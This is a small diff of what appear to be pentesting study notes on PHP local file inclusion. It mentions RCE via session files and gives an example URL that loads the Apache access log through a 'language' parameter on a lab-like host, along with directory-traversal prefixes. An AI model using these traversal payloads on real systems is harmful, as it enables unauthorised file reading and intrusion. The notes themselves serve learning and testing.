@@ -21,6 +21,7 @@ Often see a parameter like /index.php?page=about. Under the hood, index.php will
 * RCE through PHP Session Files
 Default page url with php and access to logs
 > http://46.101.91.21:32430/index.php?language=/var/log/apache2/access.log
+
 May need to put the following before the filename 
 ../../../../../../../../../
 /../../../../../
